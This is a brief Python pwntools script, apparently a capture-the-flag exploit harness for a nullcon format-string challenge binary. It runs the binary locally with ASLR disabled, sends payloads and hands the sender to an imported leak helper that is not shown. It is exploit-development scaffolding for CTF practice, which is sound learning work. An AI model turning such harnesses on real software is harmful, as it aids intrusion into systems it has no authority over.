from pwn import *
import formal_pledge

def send_payload(payload):
    p = process([exe], aslr=False)
    p.recvuntil(b'>> ')
    p.sendline(payload)
    p.recvline()
    resp = p.recvline()
    return resp, p

# binary from https://ctf.nullcon.net/challenges
exe = './junior_formatter'
elff = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# python exploit.py 
formal_pledge.leak(send_payload, elff)